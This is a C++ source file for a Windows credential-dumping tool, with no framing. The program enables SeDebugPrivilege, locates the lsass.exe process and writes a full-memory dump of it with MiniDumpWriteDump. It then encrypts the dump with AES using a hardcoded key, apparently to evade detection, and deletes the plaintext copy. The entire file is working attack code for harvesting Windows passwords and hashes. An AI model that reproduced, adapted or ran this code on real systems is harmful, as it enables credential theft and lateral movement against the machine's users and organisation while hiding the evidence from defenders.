#include <Windows.h>
#include <DbgHelp.h>
#include <cstdio>
#include <TlHelp32.h>
#include <io.h>
#include <cstring>
#include <aes.h>
#include <modes.h>
#include <osrng.h>

typedef BOOL(WINAPI* PFN_MINIDUMPWRITEDUMP)(
    HANDLE hProcess,
    DWORD ProcessId,
    HANDLE hFile,
    MINIDUMP_TYPE DumpType,
    PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
    PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
    PMINIDUMP_CALLBACK_INFORMATION CallbackParam);

BOOL EnablePrivilege() {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkp;



    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("[-] Failed to open process token.\n");
        return FALSE;
    }



    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        printf("[-] Failed to look up privilege value.\n");
        CloseHandle(hToken);
        return FALSE;
    }



    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;



    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
        printf("[-] Failed to adjust token privileges.\n");
        CloseHandle(hToken);
        return FALSE;
    }



    CloseHandle(hToken);
    return TRUE;
}

void EncFile(const CryptoPP::byte key[], const CryptoPP::byte iv[], const wchar_t* inputFile, const wchar_t* outputFile) {
    FILE* ifs;
    _wfopen_s(&ifs, inputFile, L"rb");
    if (!ifs) {
        printf("[-] Error: Failed to open input file.\n");
        return;
    }

    FILE* ofs;
    _wfopen_s(&ofs, outputFile, L"wb");
    if (!ofs) {
        fclose(ifs);
        printf("[-] Error: Failed to open output file.\n");
        return;
    }

    CryptoPP::AES::Encryption aesEncryption(key, CryptoPP::AES::DEFAULT_KEYLENGTH);
    CryptoPP::CBC_Mode_ExternalCipher::Encryption cbcEncryption(aesEncryption, iv);

    const int chunkSize = 4096;
    CryptoPP::byte input[chunkSize], output[chunkSize];
    while (true) {
        size_t bytesRead = fread(input, 1, chunkSize, ifs);
        if (bytesRead == 0) break;

        cbcEncryption.ProcessData(output, input, bytesRead);
        size_t bytesWritten = fwrite(output, 1, bytesRead, ofs);
        if (bytesWritten != bytesRead) {
            printf("[-] Error: Failed to write to output file.\n");
            break;
        }
    }

    fclose(ifs);
    fclose(ofs);

    printf("[+] File encrypted successfully.\n");
}

bool IsElevated()
{
    bool elevated = false;
    HANDLE tokenHandle = nullptr;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tokenHandle))
    {
        TOKEN_ELEVATION elevation;
        DWORD tokenSize;
        if (GetTokenInformation(tokenHandle, TokenElevation, &elevation, sizeof(elevation), &tokenSize))
        {
            elevated = elevation.TokenIsElevated != 0;
        }
        CloseHandle(tokenHandle);
    }
    return elevated;
}

int main() {
    if (EnablePrivilege()) {
        printf("[+] SeDebugPrivilege enabled successfully.\n");
    }
    else {
        printf("[-] Error: Failed to enable SeDebugPrivilege.\n");
        return 1;
    }

    if (IsElevated())
    {
        printf("[+] The program is running as an elevated process.\n");
    }
    else
    {
        printf("[-] The program is not running as an elevated process.\n");
        return 1;
    }

    FILE* dumpFile;
    errno_t err = _wfopen_s(&dumpFile, L"C:\\Windows\\tasks\\lsass.dmp", L"wb");

    if (err != 0) {
        printf("[-] Error: Failed to create dump file.\n");
        return 1;
    }


    DWORD lsass_pid = 0;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry)) {
        while (Process32Next(snapshot, &entry)) {
            if (_wcsicmp(entry.szExeFile, L"lsass.exe") == 0) {
                lsass_pid = entry.th32ProcessID;
                break;
            }
        }
    }

    CloseHandle(snapshot);

    if (lsass_pid == 0) {
        printf("[-] Error: lsass process not found.\n");
        return 1;
    }

    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);
    if (processHandle == NULL) {
        printf("[-] Error: Failed to open process.\n");
        return 1;
    }

    HANDLE dumpFileHandle = (HANDLE)_get_osfhandle(_fileno(dumpFile));
    if (dumpFileHandle == INVALID_HANDLE_VALUE) {
        printf("[-] Error: Failed to get dump file handle.\n");
        CloseHandle(processHandle);
        return 1;
    }

    HMODULE hModule = LoadLibraryA("Dbghelp.dll");
    if (hModule == NULL) {
        printf("[-] Error: Failed to load dbghelp.dll.\n");
        CloseHandle(processHandle);
        return 1;
    }

    PFN_MINIDUMPWRITEDUMP pfnMiniDumpWriteDump = reinterpret_cast<PFN_MINIDUMPWRITEDUMP>(GetProcAddress(hModule, "MiniDumpWriteDump"));
    if (pfnMiniDumpWriteDump == NULL) {
        printf("[-] Error: Failed to get MiniDumpWriteDump address.\n");
        FreeLibrary(hModule);
        CloseHandle(processHandle);
        return 1;
    }

    BOOL dumped = pfnMiniDumpWriteDump(processHandle, lsass_pid, dumpFileHandle, MiniDumpWithFullMemory, NULL, NULL, NULL);

    FreeLibrary(hModule);
    CloseHandle(processHandle);
    fclose(dumpFile);

    if (!dumped) {
        printf("[-] Error: Failed to create dump.\n");
        return 1;
    }

    printf("[+] Dump file created successfully.\n");

    CryptoPP::byte key[CryptoPP::AES::DEFAULT_KEYLENGTH] = { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10 };
    CryptoPP::byte iv[CryptoPP::AES::BLOCKSIZE] = { 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20 };

    EncFile(key, iv, L"C:\\Windows\\tasks\\lsass.dmp", L"C:\\Windows\\tasks\\encrypted_lsass.dmp");

    // Delete the original lsass dump
    if (DeleteFileW(L"C:\\Windows\\tasks\\lsass.dmp")) {
        printf("[+] Original dump file deleted successfully.\n");
    }
    else {
        printf("[-] Error: Failed to delete original dump file.\n");
    }

    return 0;
}
